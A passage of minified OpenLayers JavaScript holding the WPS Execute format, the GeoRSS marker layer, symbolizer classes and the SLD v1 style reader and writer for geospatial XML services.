a&&(a=\nOpenLayers.Format.XML.prototype.read.apply(this,[a]));a&&9==a.nodeType&&(a=a.documentElement);var b={};this.readNode(a,b);return b},writers:{wps:{Execute:function(a){var b=this.createElementNSPlus(\"wps:Execute\",{attributes:{version:this.VERSION,service:\"WPS\"}});this.writeNode(\"ows:Identifier\",a.identifier,b);this.writeNode(\"wps:DataInputs\",a.dataInputs,b);this.writeNode(\"wps:ResponseForm\",a.responseForm,b);return b},ResponseForm:function(a){var b=this.createElementNSPlus(\"wps:ResponseForm\",{});a.rawDataOutput&&\nthis.writeNode(\"wps:RawDataOutput\",a.rawDataOutput,b);a.responseDocument&&this.writeNode(\"wps:ResponseDocument\",a.responseDocument,b);return b},ResponseDocument:function(a){var b=this.createElementNSPlus(\"wps:ResponseDocument\",{attributes:{storeExecuteResponse:a.storeExecuteResponse,lineage:a.lineage,status:a.status}});if(a.outputs)for(var c=0,d=a.outputs.length;c<d;c++)this.writeNode(\"wps:Output\",a.outputs[c],b);return b},Output:function(a){var b=this.createElementNSPlus(\"wps:Output\",{attributes:{asReference:a.asReference,\nmimeType:a.mimeType,encoding:a.encoding,schema:a.schema}});this.writeNode(\"ows:Identifier\",a.identifier,b);this.writeNode(\"ows:Title\",a.title,b);this.writeNode(\"ows:Abstract\",a[\"abstract\"],b);return b},RawDataOutput:function(a){var b=this.createElementNSPlus(\"wps:RawDataOutput\",{attributes:{mimeType:a.mimeType,encoding:a.encoding,schema:a.schema}});this.writeNode(\"ows:Identifier\",a.identifier,b);return b},DataInputs:function(a){for(var b=this.createElementNSPlus(\"wps:DataInputs\",{}),c=0,d=a.length;c<\nd;++c)this.writeNode(\"wps:Input\",a[c],b);return b},Input:function(a){var b=this.createElementNSPlus(\"wps:Input\",{});this.writeNode(\"ows:Identifier\",a.identifier,b);a.title&&this.writeNode(\"ows:Title\",a.title,b);a.data&&this.writeNode(\"wps:Data\",a.data,b);a.reference&&this.writeNode(\"wps:Reference\",a.reference,b);a.boundingBoxData&&this.writeNode(\"wps:BoundingBoxData\",a.boundingBoxData,b);return b},Data:function(a){var b=this.createElementNSPlus(\"wps:Data\",{});a.literalData?this.writeNode(\"wps:LiteralData\",\na.literalData,b):a.complexData?this.writeNode(\"wps:ComplexData\",a.complexData,b):a.boundingBoxData&&this.writeNode(\"ows:BoundingBox\",a.boundingBoxData,b);return b},LiteralData:function(a){return this.createElementNSPlus(\"wps:LiteralData\",{attributes:{uom:a.uom},value:a.value})},ComplexData:function(a){var b=this.createElementNSPlus(\"wps:ComplexData\",{attributes:{mimeType:a.mimeType,encoding:a.encoding,schema:a.schema}}),c=a.value;\"string\"===typeof c?b.appendChild(this.getXMLDoc().createCDATASection(a.value)):\nb.appendChild(c);return b},Reference:function(a){var b=this.createElementNSPlus(\"wps:Reference\",{attributes:{mimeType:a.mimeType,\"xlink:href\":a.href,method:a.method,encoding:a.encoding,schema:a.schema}});a.body&&this.writeNode(\"wps:Body\",a.body,b);return b},BoundingBoxData:function(a,b){this.writers.ows.BoundingBox.apply(this,[a,b,\"wps:BoundingBoxData\"])},Body:function(a){var b=this.createElementNSPlus(\"wps:Body\",{});a.wcs?this.writeNode(\"wcs:GetCoverage\",a.wcs,b):a.wfs?(this.featureType=a.wfs.featureType,\nthis.version=a.wfs.version,this.writeNode(\"wfs:GetFeature\",a.wfs,b)):this.writeNode(\"wps:Execute\",a,b);return b}},wcs:OpenLayers.Format.WCSGetCoverage.prototype.writers.wcs,wfs:OpenLayers.Format.WFST.v1_1_0.prototype.writers.wfs,ogc:OpenLayers.Format.Filter.v1_1_0.prototype.writers.ogc,ows:OpenLayers.Format.OWSCommon.v1_1_0.prototype.writers.ows},readers:{wps:{ExecuteResponse:function(a,b){b.executeResponse={lang:a.getAttribute(\"lang\"),statusLocation:a.getAttribute(\"statusLocation\"),serviceInstance:a.getAttribute(\"serviceInstance\"),\nservice:a.getAttribute(\"service\")};this.readChildNodes(a,b.executeResponse)},Process:function(a,b){b.process={};this.readChildNodes(a,b.process)},Status:function(a,b){b.status={creationTime:a.getAttribute(\"creationTime\")};this.readChildNodes(a,b.status)},ProcessSucceeded:function(a,b){b.processSucceeded=!0},ProcessOutputs:function(a,b){b.processOutputs=[];this.readChildNodes(a,b.processOutputs)},Output:function(a,b){var c={};this.readChildNodes(a,c);b.push(c)},Reference:function(a,b){b.reference=\n{href:a.getAttribute(\"href\"),mimeType:a.getAttribute(\"mimeType\"),encoding:a.getAttribute(\"encoding\"),schema:a.getAttribute(\"schema\")}},Data:function(a,b){b.data={};this.readChildNodes(a,b)},LiteralData:function(a,b){b.literalData={dataType:a.getAttribute(\"dataType\"),uom:a.getAttribute(\"uom\"),value:this.getChildValue(a)}},ComplexData:function(a,b){b.complexData={mimeType:a.getAttribute(\"mimeType\"),schema:a.getAttribute(\"schema\"),encoding:a.getAttribute(\"encoding\"),value:\"\"};if(this.isSimpleContent(a)){var c;\nfor(c=a.firstChild;c;c=c.nextSibling)switch(c.nodeType){case 3:case 4:b.complexData.value+=c.nodeValue}}else for(c=a.firstChild;c;c=c.nextSibling)1==c.nodeType&&(b.complexData.value=c)},BoundingBox:function(a,b){b.boundingBoxData={dimensions:a.getAttribute(\"dimensions\"),crs:a.getAttribute(\"crs\")};this.readChildNodes(a,b.boundingBoxData)}},ows:OpenLayers.Format.OWSCommon.v1_1_0.prototype.readers.ows},CLASS_NAME:\"OpenLayers.Format.WPSExecute\"});OpenLayers.Layer.GeoRSS=OpenLayers.Class(OpenLayers.Layer.Markers,{location:null,features:null,formatOptions:null,selectedFeature:null,icon:null,popupSize:null,useFeedTitle:!0,initialize:function(a,b,c){OpenLayers.Layer.Markers.prototype.initialize.apply(this,[a,c]);this.location=b;this.features=[]},destroy:function(){OpenLayers.Layer.Markers.prototype.destroy.apply(this,arguments);this.clearFeatures();this.features=null},loadRSS:function(){this.loaded||(this.events.triggerEvent(\"loadstart\"),OpenLayers.Request.GET({url:this.location,\nsuccess:this.parseData,scope:this}),this.loaded=!0)},moveTo:function(a,b,c){OpenLayers.Layer.Markers.prototype.moveTo.apply(this,arguments);this.visibility&&!this.loaded&&this.loadRSS()},parseData:function(a){var b=a.responseXML;b&&b.documentElement||(b=OpenLayers.Format.XML.prototype.read(a.responseText));if(this.useFeedTitle){a=null;try{a=b.getElementsByTagNameNS(\"*\",\"title\")[0].firstChild.nodeValue}catch(c){a=b.getElementsByTagName(\"title\")[0].firstChild.nodeValue}a&&this.setName(a)}a={};OpenLayers.Util.extend(a,\nthis.formatOptions);this.map&&!this.projection.equals(this.map.getProjectionObject())&&(a.externalProjection=this.projection,a.internalProjection=this.map.getProjectionObject());b=(new OpenLayers.Format.GeoRSS(a)).read(b);a=0;for(var d=b.length;a<d;a++){var e={},f=b[a];if(f.geometry){var g=f.attributes.title?f.attributes.title:\"Untitled\",h=f.attributes.description?f.attributes.description:\"No description.\",k=f.attributes.link?f.attributes.link:\"\",f=f.geometry.getBounds().getCenterLonLat();e.icon=\nnull==this.icon?OpenLayers.Marker.defaultIcon():this.icon.clone();e.popupSize=this.popupSize?this.popupSize.clone():new OpenLayers.Size(250,120);if(g||h){e.title=g;e.description=h;var l='<div class=\"olLayerGeoRSSClose\">[x]</div>',l=l+'<div class=\"olLayerGeoRSSTitle\">';k&&(l+='<a class=\"link\" href=\"'+k+'\" target=\"_blank\">');l+=g;k&&(l+=\"</a>\");l+=\"</div>\";l+='<div style=\"\" class=\"olLayerGeoRSSDescription\">';l+=h;l+=\"</div>\";e.popupContentHTML=l}f=new OpenLayers.Feature(this,f,e);this.features.push(f);\ne=f.createMarker();e.events.register(\"click\",f,this.markerClick);this.addMarker(e)}}this.events.triggerEvent(\"loadend\")},markerClick:function(a){var b=this==this.layer.selectedFeature;this.layer.selectedFeature=b?null:this;for(var c=0,d=this.layer.map.popups.length;c<d;c++)this.layer.map.removePopup(this.layer.map.popups[c]);b||(b=this.createPopup(),OpenLayers.Event.observe(b.div,\"click\",OpenLayers.Function.bind(function(){for(var a=0,b=this.layer.map.popups.length;a<b;a++)this.layer.map.removePopup(this.layer.map.popups[a])},\nthis)),this.layer.map.addPopup(b));OpenLayers.Event.stop(a)},clearFeatures:function(){if(null!=this.features)for(;0<this.features.length;){var a=this.features[0];OpenLayers.Util.removeItem(this.features,a);a.destroy()}},CLASS_NAME:\"OpenLayers.Layer.GeoRSS\"});OpenLayers.Symbolizer.Point=OpenLayers.Class(OpenLayers.Symbolizer,{initialize:function(a){OpenLayers.Symbolizer.prototype.initialize.apply(this,arguments)},CLASS_NAME:\"OpenLayers.Symbolizer.Point\"});OpenLayers.Symbolizer.Line=OpenLayers.Class(OpenLayers.Symbolizer,{initialize:function(a){OpenLayers.Symbolizer.prototype.initialize.apply(this,arguments)},CLASS_NAME:\"OpenLayers.Symbolizer.Line\"});OpenLayers.Symbolizer.Text=OpenLayers.Class(OpenLayers.Symbolizer,{initialize:function(a){OpenLayers.Symbolizer.prototype.initialize.apply(this,arguments)},CLASS_NAME:\"OpenLayers.Symbolizer.Text\"});OpenLayers.Format.SLD.v1=OpenLayers.Class(OpenLayers.Format.Filter.v1_0_0,{namespaces:{sld:\"http://www.opengis.net/sld\",ogc:\"http://www.opengis.net/ogc\",gml:\"http://www.opengis.net/gml\",xlink:\"http://www.w3.org/1999/xlink\",xsi:\"http://www.w3.org/2001/XMLSchema-instance\"},defaultPrefix:\"sld\",schemaLocation:null,multipleSymbolizers:!1,featureTypeCounter:null,defaultSymbolizer:{fillColor:\"#808080\",fillOpacity:1,strokeColor:\"#000000\",strokeOpacity:1,strokeWidth:1,strokeDashstyle:\"solid\",pointRadius:3,\ngraphicName:\"square\"},read:function(a,b){b=OpenLayers.Util.applyDefaults(b,this.options);var c={namedLayers:!0===b.namedLayersAsArray?[]:{}};this.readChildNodes(a,c);return c},readers:OpenLayers.Util.applyDefaults({sld:{StyledLayerDescriptor:function(a,b){b.version=a.getAttribute(\"version\");this.readChildNodes(a,b)},Name:function(a,b){b.name=this.getChildValue(a)},Title:function(a,b){b.title=this.getChildValue(a)},Abstract:function(a,b){b.description=this.getChildValue(a)},NamedLayer:function(a,b){var c=\n{userStyles:[],namedStyles:[]};this.readChildNodes(a,c);for(var d=0,e=c.userStyles.length;d<e;++d)c.userStyles[d].layerName=c.name;OpenLayers.Util.isArray(b.namedLayers)?b.namedLayers.push(c):b.namedLayers[c.name]=c},NamedStyle:function(a,b){b.namedStyles.push(this.getChildName(a.firstChild))},UserStyle:function(a,b){var c={defaultsPerSymbolizer:!0,rules:[]};this.featureTypeCounter=-1;this.readChildNodes(a,c);this.multipleSymbolizers?(delete c.defaultsPerSymbolizer,c=new OpenLayers.Style2(c)):c=new OpenLayers.Style(this.defaultSymbolizer,\nc);b.userStyles.push(c)},IsDefault:function(a,b){\"1\"==this.getChildValue(a)&&(b.isDefault=!0)},FeatureTypeStyle:function(a,b){++this.featureTypeCounter;var c={rules:this.multipleSymbolizers?b.rules:[]};this.readChildNodes(a,c);this.multipleSymbolizers||(b.rules=c.rules)},Rule:function(a,b){var c;this.multipleSymbolizers&&(c={symbolizers:[]});c=new OpenLayers.Rule(c);this.readChildNodes(a,c);b.rules.push(c)},ElseFilter:function(a,b){b.elseFilter=!0},MinScaleDenominator:function(a,b){b.minScaleDenominator=\nparseFloat(this.getChildValue(a))},MaxScaleDenominator:function(a,b){b.maxScaleDenominator=parseFloat(this.getChildValue(a))},TextSymbolizer:function(a,b){var c={};this.readChildNodes(a,c);this.multipleSymbolizers?(c.zIndex=this.featureTypeCounter,b.symbolizers.push(new OpenLayers.Symbolizer.Text(c))):b.symbolizer.Text=OpenLayers.Util.applyDefaults(c,b.symbolizer.Text)},LabelPlacement:function(a,b){this.readChildNodes(a,b)},PointPlacement:function(a,b){var c={};this.readChildNodes(a,c);c.labelRotation=\nc.rotation;delete c.rotation;var d,e=b.labelAnchorPointX,f=b.labelAnchorPointY;e<=1/3?d=\"l\":e>1/3&&e<2/3?d=\"c\":e>=2/3&&(d=\"r\");f<=1/3?d+=\"b\":f>1/3&&f<2/3?d+=\"m\":f>=2/3&&(d+=\"t\");c.labelAlign=d;OpenLayers.Util.applyDefaults(b,c)},AnchorPoint:function(a,b){this.readChildNodes(a,b)},AnchorPointX:function(a,b){var c=this.readers.ogc._expression.call(this,a);c&&(b.labelAnchorPointX=c)},AnchorPointY:function(a,b){var c=this.readers.ogc._expression.call(this,a);c&&(b.labelAnchorPointY=c)},Displacement:function(a,\nb){this.readChildNodes(a,b)},DisplacementX:function(a,b){var c=this.readers.ogc._expression.call(this,a);c&&(b.labelXOffset=c)},DisplacementY:function(a,b){var c=this.readers.ogc._expression.call(this,a);c&&(b.labelYOffset=c)},LinePlacement:function(a,b){this.readChildNodes(a,b)},PerpendicularOffset:function(a,b){var c=this.readers.ogc._expression.call(this,a);c&&(b.labelPerpendicularOffset=c)},Label:function(a,b){var c=this.readers.ogc._expression.call(this,a);c&&(b.label=c)},Font:function(a,b){this.readChildNodes(a,\nb)},Halo:function(a,b){var c={};this.readChildNodes(a,c);b.haloRadius=c.haloRadius;b.haloColor=c.fillColor;b.haloOpacity=c.fillOpacity},Radius:function(a,b){var c=this.readers.ogc._expression.call(this,a);null!=c&&(b.haloRadius=c)},RasterSymbolizer:function(a,b){var c={};this.readChildNodes(a,c);this.multipleSymbolizers?(c.zIndex=this.featureTypeCounter,b.symbolizers.push(new OpenLayers.Symbolizer.Raster(c))):b.symbolizer.Raster=OpenLayers.Util.applyDefaults(c,b.symbolizer.Raster)},Geometry:function(a,\nb){b.geometry={};this.readChildNodes(a,b.geometry)},ColorMap:function(a,b){b.colorMap=[];this.readChildNodes(a,b.colorMap)},ColorMapEntry:function(a,b){var c=a.getAttribute(\"quantity\"),d=a.getAttribute(\"opacity\");b.push({color:a.getAttribute(\"color\"),quantity:null!==c?parseFloat(c):void 0,label:a.getAttribute(\"label\")||void 0,opacity:null!==d?parseFloat(d):void 0})},LineSymbolizer:function(a,b){var c={};this.readChildNodes(a,c);this.multipleSymbolizers?(c.zIndex=this.featureTypeCounter,b.symbolizers.push(new OpenLayers.Symbolizer.Line(c))):\nb.symbolizer.Line=OpenLayers.Util.applyDefaults(c,b.symbolizer.Line)},PolygonSymbolizer:function(a,b){var c={fill:!1,stroke:!1};this.multipleSymbolizers||(c=b.symbolizer.Polygon||c);this.readChildNodes(a,c);this.multipleSymbolizers?(c.zIndex=this.featureTypeCounter,b.symbolizers.push(new OpenLayers.Symbolizer.Polygon(c))):b.symbolizer.Polygon=c},PointSymbolizer:function(a,b){var c={fill:!1,stroke:!1,graphic:!1};this.multipleSymbolizers||(c=b.symbolizer.Point||c);this.readChildNodes(a,c);this.multipleSymbolizers?\n(c.zIndex=this.featureTypeCounter,b.symbolizers.push(new OpenLayers.Symbolizer.Point(c))):b.symbolizer.Point=c},Stroke:function(a,b){b.stroke=!0;this.readChildNodes(a,b)},Fill:function(a,b){b.fill=!0;this.readChildNodes(a,b)},CssParameter:function(a,b){var c=a.getAttribute(\"name\"),d=this.cssMap[c];b.label&&(\"fill\"===c?d=\"fontColor\":\"fill-opacity\"===c&&(d=\"fontOpacity\"));d&&(c=this.readers.ogc._expression.call(this,a))&&(b[d]=c)},Graphic:function(a,b){b.graphic=!0;var c={};this.readChildNodes(a,c);\nfor(var d=\"stroke strokeColor strokeWidth strokeOpacity strokeLinecap fill fillColor fillOpacity graphicName rotation graphicFormat\".split(\" \"),e,f,g=0,h=d.length;g<h;++g)e=d[g],f=c[e],void 0!=f&&(b[e]=f);void 0!=c.opacity&&(b.graphicOpacity=c.opacity);void 0!=c.size&&(isNaN(c.size/2)?b.graphicWidth=c.size:b.pointRadius=c.size/2);void 0!=c.href&&(b.externalGraphic=c.href);void 0!=c.rotation&&(b.rotation=c.rotation)},ExternalGraphic:function(a,b){this.readChildNodes(a,b)},Mark:function(a,b){this.readChildNodes(a,\nb)},WellKnownName:function(a,b){b.graphicName=this.getChildValue(a)},Opacity:function(a,b){var c=this.readers.ogc._expression.call(this,a);c&&(b.opacity=c)},Size:function(a,b){var c=this.readers.ogc._expression.call(this,a);c&&(b.size=c)},Rotation:function(a,b){var c=this.readers.ogc._expression.call(this,a);c&&(b.rotation=c)},OnlineResource:function(a,b){b.href=this.getAttributeNS(a,this.namespaces.xlink,\"href\")},Format:function(a,b){b.graphicFormat=this.getChildValue(a)}}},OpenLayers.Format.Filter.v1_0_0.prototype.readers),\ncssMap:{stroke:\"strokeColor\",\"stroke-opacity\":\"strokeOpacity\",\"stroke-width\":\"strokeWidth\",\"stroke-linecap\":\"strokeLinecap\",\"stroke-dasharray\":\"strokeDashstyle\",fill:\"fillColor\",\"fill-opacity\":\"fillOpacity\",\"font-family\":\"fontFamily\",\"font-size\":\"fontSize\",\"font-weight\":\"fontWeight\",\"font-style\":\"fontStyle\"},getCssProperty:function(a){var b=null,c;for(c in this.cssMap)if(this.cssMap[c]==a){b=c;break}return b},getGraphicFormat:function(a){var b,c;for(c in this.graphicFormats)if(this.graphicFormats[c].test(a)){b=\nc;break}return b||this.defaultGraphicFormat},defaultGraphicFormat:\"image/png\",graphicFormats:{\"image/jpeg\":/\\.jpe?g$/i,\"image/gif\":/\\.gif$/i,\"image/png\":/\\.png$/i},write:function(a){return this.writers.sld.StyledLayerDescriptor.apply(this,[a])},writers:OpenLayers.Util.applyDefaults({sld:{_OGCExpression:function(a,b){var c=this.createElementNSPlus(a),d=\"string\"==typeof b?b.split(\"${\"):[b];c.appendChild(this.createTextNode(d[0]));for(var e,f,g=1,h=d.length;g<h;g++)e=d[g],f=e.indexOf(\"}\"),0<f?(this.writeNode(\"ogc:PropertyName\",\n{property:e.substring(0,f)},c),c.appendChild(this.createTextNode(e.substring(++f)))):c.appendChild(this.createTextNode(\"${\"+e));return c},StyledLayerDescriptor:function(a){var b=this.createElementNSPlus(\"sld:StyledLayerDescriptor\",{attributes:{version:this.VERSION,\"xsi:schemaLocation\":this.schemaLocation}});b.setAttribute(\"xmlns:ogc\",this.namespaces.ogc);b.setAttribute(\"xmlns:gml\",this.namespaces.gml);a.name&&this.writeNode(\"Name\",a.name,b);a.title&&this.writeNode(\"Title\",a.title,b);a.description&&\nthis.writeNode(\"Abstract\",a.description,b);if(OpenLayers.Util.isArray(a.namedLayers))for(var c=0,d=a.namedLayers.length;c<d;++c)this.writeNode(\"NamedLayer\",a.namedLayers[c],b);else for(c in a.namedLayers)this.writeNode(\"NamedLayer\",a.namedLayers[c],b);return b},Name:function(a){return this.createElementNSPlus(\"sld:Name\",{value:a})},Title:function(a){return this.createElementNSPlus(\"sld:Title\",{value:a})},Abstract:function(a){return this.createElementNSPlus(\"sld:Abstract\",{value:a})},NamedLayer:function(a){var b=\nthis.createElementNSPlus(\"sld:NamedLayer\");this.writeNode(\"Name\",a.name,b);if(a.namedStyles)for(var c=0,d=a.namedStyles.length;c<d;++c)this.writeNode(\"NamedStyle\",a.namedStyles[c],b);if(a.userStyles)for(c=0,d=a.userStyles.length;c<d;++c)this.writeNode(\"UserStyle\",a.userStyles[c],b);return b},NamedStyle:function(a){var b=this.createElementNSPlus(\"sld:NamedStyle\");this.writeNode(\"Name\",a,b);return b},UserStyle:function(a){var b=this.createElementNSPlus(\"sld:UserStyle\");a.name&&this.writeNode(\"Name\",\na.name,b);a.title&&this.writeNode(\"Title\",a.title,b);a.description&&this.writeNode(\"Abstract\",a.description,b);a.isDefault&&this.writeNode(\"IsDefault\",a.isDefault,b);if(this.multipleSymbolizers&&a.rules){for(var c={0:[]},d=[0],e,f,g,h,k,l=0,m=a.rules.length;l<m;++l)if(e=a.rules[l],e.symbolizers){f={};for(var n=0,p=e.symbolizers.length;n<p;++n)g=e.symbolizers[n],h=g.zIndex,h in f||(k=e.clone(),k.symbolizers=[],f[h]=k),f[h].symbolizers.push(g.clone());for(h in f)h in c||(d.push(h),c[h]=[]),c[h].push(f[h])}else c[0].push(e.clone());\nd.sort();l=0;for(m=d.length;l<m;++l)e=c[d[l]],0<e.length&&(k=a.clone(),k.rules=c[d[l]],this.writeNode(\"FeatureTypeStyle\",k,b))}else this.writeNode(\"FeatureTypeStyle\",a,b);return b},IsDefault:function(a){return this.createElementNSPlus(\"sld:IsDefault\",{value:a?\"1\":\"0\"})},FeatureTypeStyle:function(a){for(var b=this.createElementNSPlus(\"sld:FeatureTypeStyle\"),c=0,d=a.rules.length;c<d;++c)this.writeNode(\"Rule\",a.rules[c],b);return b},Rule:function(a){var b=this.createElementNSPlus(\"sld:Rule\");a.name&&\nthis.writeNode(\"Name\",a.name,b);a.title&&this.writeNode(\"Title\",a.title,b);a.description&&this.writeNode(\"Abstract\",a.description,b);a.elseFilter?this.writeNode(\"ElseFilter\",null,b):a.filter&&this.writeNode(\"ogc:Filter\",a.filter,b);void 0!=a.minScaleDenominator&&this.writeNode(\"MinScaleDenominator\",a.minScaleDenominator,b);void 0!=a.maxScaleDenominator&&this.writeNode(\"MaxScaleDenominator\",a.maxScaleDenominator,b);var c,d;if(this.multipleSymbolizers&&a.symbolizers)for(var e=0,f=a.symbolizers.length;e<\nf;++e)d=a.symbolizers[e],c=d.CLASS_NAME.split(\".\").pop(),this.writeNode(c+\"Symbolizer\",d,b);else for(var f=OpenLayers.Style.SYMBOLIZER_PREFIXES,e=0,g=f.length;e<g;++e)c=f[e],(d=a.symbolizer[c])&&this.writeNode(c+\"Symbolizer\",d,b);return b},ElseFilter:function(){return this.createElementNSPlus(\"sld:ElseFilter\")},MinScaleDenominator:function(a){return this.createElementNSPlus(\"sld:MinScaleDenominator\",{value:a})},MaxScaleDenominator:function(a){return this.createElementNSPlus(\"sld:MaxScaleDenominator\",\n{value:a})},LineSymbolizer:function(a){var b=this.createElementNSPlus(\"sld:LineSymbolizer\");this.writeNode(\"Stroke\",a,b);return b},Stroke:function(a){var b=this.createElementNSPlus(\"sld:Stroke\");void 0!=a.strokeColor&&this.writeNode(\"CssParameter\",{symbolizer:a,key:\"strokeColor\"},b);void 0!=a.strokeOpacity&&this.writeNode(\"CssParameter\",{symbolizer:a,key:\"strokeOpacity\"},b);void 0!=a.strokeWidth&&this.writeNode(\"CssParameter\",{symbolizer:a,key:\"strokeWidth\"},b);void 0!=a.strokeDashstyle&&\"solid\"!==\na.strokeDashstyle&&this.writeNode(\"CssParameter\",{symbolizer:a,key:\"strokeDashstyle\"},b);void 0!=a.strokeLinecap&&this.writeNode(\"CssParameter\",{symbolizer:a,key:\"strokeLinecap\"},b);return b},CssParameter:function(a){return this.createElementNSPlus(\"sld:CssParameter\",{attributes:{name:this.getCssProperty(a.key)},value:a.symbolizer[a.key]})},TextSymbolizer:function(a){var b=this.createElementNSPlus(\"sld:TextSymbolizer\");null!=a.label&&this.writeNode(\"Label\",a.label,b);null==a.fontFamily&&null==a.fontSize&&\nnull==a.fontWeight&&null==a.fontStyle||this.writeNode(\"Font\",a,b);null==a.labelAnchorPointX&&null==a.labelAnchorPointY&&null==a.labelAlign&&null==a.labelXOffset&&null==a.labelYOffset&&null==a.labelRotation&&null==a.labelPerpendicularOffset||this.writeNode(\"LabelPlacement\",a,b);null==a.haloRadius&&null==a.haloColor&&null==a.haloOpacity||this.writeNode(\"Halo\",a,b);null==a.fontColor&&null==a.fontOpacity||this.writeNode(\"Fill\",{fillColor:a.fontColor,fillOpacity:a.fontOpacity},b);return b},LabelPlacement:function(a){var b=\nthis.createElementNSPlus(\"sld:LabelPlacement\");null==a.labelAnchorPointX&&null==a.labelAnchorPointY&&null==a.labelAlign&&null==a.labelXOffset&&null==a.labelYOffset&&null==a.labelRotation||null!=a.labelPerpendicularOffset||this.writeNode(\"PointPlacement\",a,b);null!=a.labelPerpendicularOffset&&this.writeNode(\"LinePlacement\",a,b);return b},LinePlacement:function(a){var b=this.createElementNSPlus(\"sld:LinePlacement\");this.writeNode(\"PerpendicularOffset\",a.labelPerpendicularOffset,b);return b},PerpendicularOffset:function(a){return this.createElementNSPlus(\"sld:PerpendicularOffset\",\n{value:a})},PointPlacement:function(a){var b=this.createElementNSPlus(\"sld:PointPlacement\");null==a.labelAnchorPointX&&null==a.labelAnchorPointY&&null==a.labelAlign||this.writeNode(\"AnchorPoint\",a,b);null==a.labelXOffset&&null==a.labelYOffset||this.writeNode(\"Displacement\",a,b);null!=a.labelRotation&&this.writeNode(\"Rotation\",a.labelRotation,b);return b},AnchorPoint:function(a){var b=this.createElementNSPlus(\"sld:AnchorPoint\"),c=a.labelAnchorPointX,d=a.labelAnchorPointY;null!=c&&this.writeNode(\"AnchorPointX\",\nc,b);null!=d&&this.writeNode(\"AnchorPointY\",d,b);if(null==c&&null==d){var e=a.labelAlign.substr(0,1);a=a.labelAlign.substr(1,1);\"l\"===e?c=0:\"c\"===e?c=0.5:\"r\"===e&&(c=1);\"b\"===a?d=0:\"m\"===a?d=0.5:\"t\"===a&&(d=1);this.writeNode(\"AnchorPointX\",c,b);this.writeNode(\"AnchorPointY\",d,b)}return b},AnchorPointX:function(a){return this.createElementNSPlus(\"sld:AnchorPointX\",{value:a})},AnchorPointY:function(a){return this.createElementNSPlus(\"sld:AnchorPointY\",{value:a})},Displacement:function(a){var b=this.createElementNSPlus(\"sld:Displacement\");\nnull!=a.labelXOffset&&this.writeNode(\"DisplacementX\",a.labelXOffset,b);null!=a.labelYOffset&&this.writeNode(\"DisplacementY\",a.labelYOffset,b);return b},DisplacementX:function(a){return this.createElementNSPlus(\"sld:DisplacementX\",{value:a})},DisplacementY:function(a){return this.createElementNSPlus(\"sld:DisplacementY\",{value:a})},Font:function(a){var b=this.createElementNSPlus(\"sld:Font\");a.fontFamily&&this.writeNode(\"CssParameter\",{symbolizer:a,key:\"fontFamily\"},b);a.fontSize&&this.writeNode(\"CssParameter\",\n{symbolizer:a,key:\"fontSize\"},b);a.fontWeight&&this.writeNode(\"CssParameter\",{symbolizer:a,key:\"fontWeight\"},b);a.fontStyle&&this.writeNode(\"CssParameter\",{symbolizer:a,key:\"fontStyle\"},b);return b},Label:function(a){return this.writers.sld._OGCExpression.call(this,\"sld:Label\",a)},Halo:function(a){var b=this.createElementNSPlus(\"sld:Halo\");a.haloRadius&&this.writeNode(\"Radius\",a.haloRadius,b);(a.haloColor||a.haloOpacity)&&this.writeNode(\"Fill\",{fillColor:a.haloColor,fillOpacity:a.haloOpacity},b);\nreturn b},Radius:function(a){return this.createElementNSPlus(\"sld:Radius\",{value:a})},RasterSymbolizer:function(a){var b=this.createElementNSPlus(\"sld:RasterSymbolizer\");a.geometry&&this.writeNode(\"Geometry\",a.geometry,b);a.opacity&&this.writeNode(\"Opacity\",a.opacity,b);a.colorMap&&this.writeNode(\"ColorMap\",a.colorMap,b);return b},Geometry:function(a){var b=this.createElementNSPlus(\"sld:Geometry\");a.property&&this.writeNode(\"ogc:PropertyName\",a,b);return b},ColorMap:function(a){for(var b=this.createElementNSPlus(\"sld:ColorMap\"),\nc=0,d=a.length;c<d;++c)this.writeNode(\"ColorMapEntry\",a[c],b);return b},ColorMapEntry:function(a){var b=this.createElementNSPlus(\"sld:ColorMapEntry\");b.setAttribute(\"color\",a.color);void 0!==a.opacity&&b.setAttribute(\"opacity\",parseFloat(a.opacity));void 0!==a.quantity&&b.setAttribute(\"quantity\",parseFloat(a.quantity));void 0!==a.label&&b.setAttribute(\"label\",a.label);return b},PolygonSymbolizer:function(a){var b=this.createElementNSPlus(\"sld:PolygonSymbolizer\");!1!==a.fill&&this.writeNode(\"Fill\",\na,b);!1!==a.stroke&&this.writeNode(\"Stroke\",a,b);return b},Fill:function(a){var b=this.createElementNSPlus(\"sld:Fill\");a.fillColor&&this.writeNode(\"CssParameter\",{symbolizer:a,key:\"fillColor\"},b);null!=a.fillOpacity&&this.writeNode(\"CssParameter\",{symbolizer:a,key:\"fillOpacity\"},b);return b},PointSymbolizer:function(a){var b=this.createElementNSPlus(\"sld:PointSymbolizer\");this.writeNode(\"Graphic\",a,b);return b},Graphic:function(a){var b=this.createElementNSPlus(\"sld:Graphic\");void 0!=a.externalGraphic?\nthis.writeNode(\"ExternalGraphic\",a,b):this.writeNode(\"Mark\",a,b);void 0!=a.graphicOpacity&&this.writeNode(\"Opacity\",a.graphicOpacity,b);void 0!=a.pointRadius?this.writeNode(\"Size\",2*a.pointRadius,b):void 0!=a.graphicWidth&&this.writeNode(\"Size\",a.graphicWidth,b);void 0!=a.rotation&&this.writeNode(\"Rotation\",a.rotation,b);return b},ExternalGraphic:function(a){var b=this.createElementNSPlus(\"sld:ExternalGraphic\");this.writeNode(\"OnlineResource\",a.externalGraphic,b);a=a.graphicFormat||this.getGraphicFormat(a.externalGraphic);\nthis.writeNode(\"Format\",a,b);return b},Mark:function(a){var b=this.createElementNSPlus(\"sld:Mark\");a.graphicName&&this.writeNode(\"WellKnownName\",a.graphicName,b);!1!==a.fill&&this.writeNode(\"Fill\",a,b);!1!==a.stroke&&this.writeNode(\"Stroke\",a,b);return b},WellKnownName:function(a){return this.createElementNSPlus(\"sld:WellKnownName\",{value:a})},Opacity:function(a){return this.createElementNSPlus(\"sld:Opacity\",{value:a})},Size:function(a){return this.writers.sld._OGCExpression.call(this,\"sld:Size\",\na)},Rotation:function(a){return this.createElementNSPlus(\"sld:Rotation\",{value:a})},OnlineResource:function(a){return this.createElementNSPlus(\"sld:OnlineResource\",{attributes:{\"xlink:type\":\"simple\",\"xlink:href\":a}})},Format:function(a){return 